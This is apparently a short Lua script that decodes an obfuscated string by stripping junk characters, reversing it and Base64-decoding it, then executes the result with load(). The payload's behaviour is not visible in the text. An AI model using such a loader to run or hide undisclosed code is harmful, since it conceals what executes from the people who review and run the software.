
-- Highly Obfuscated script
local encodedScript = "=3kC2Kp2kiYIlX1EYdwY9G1ZB39iXbp3FWZbv2EmXdw1M3YaF39iYe61VG3Zp2x22cl3l3YLtX92XYu1Qn2blXRnXbvXNm2clZNX2di3VH2a0Xl23ZuXcXZYyY9y1L6XMHYc0ZRHZaiYgCZdlXdEZc02RH1S6ZUWYbh2dG1Kn25W1ayZR3Yck2F21bs1pg3CiYcX3Zm3dXXZiYAS2PgXs22bvXhmZYlZdl1Ci3cX1Zm1V22diXASYPgYUW2bh15m3cl1NX2V"

-- Cleanup function to remove junk characters
local function clean(str)
    return str:gsub("[XYZ123]", "")
end

-- Reverse function
local function reverse(str)
    return str:reverse()
end

-- Base64 Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the obfuscated script
local scriptFunc = load(decode(reverse(clean(encodedScript))))
if scriptFunc then scriptFunc() end
